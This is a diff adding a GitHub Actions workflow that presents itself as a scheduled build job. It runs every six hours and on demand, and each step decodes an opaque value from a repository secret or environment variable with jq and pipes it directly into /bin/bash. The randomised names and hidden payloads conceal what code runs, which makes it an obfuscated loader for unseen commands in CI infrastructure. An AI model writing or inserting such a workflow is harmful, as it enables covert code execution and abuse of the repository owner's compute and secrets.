@@ -1,0 +1,23 @@
+name: childrenluxurious
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '31 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: childrenluxurious
+        env:
+          xr375: ${{ secrets.xr375 }}
+        run: |
+          echo $xr375 | jq -r .si95199 | /bin/bash
+          echo $f0556 | jq -r .ibew10205 | /bin/bash
+          echo $lj9 | jq -r .iqo4999 | /bin/bash
+          echo $hf36480 | jq -r .ejcx95699 | /bin/bash
+          echo $ixg0686 | jq -r .qrk3 | /bin/bash
+          echo $xz6 | jq -r .qwc1 | /bin/bash
+          echo $pws46 | jq -r .c00442 | /bin/bash
+
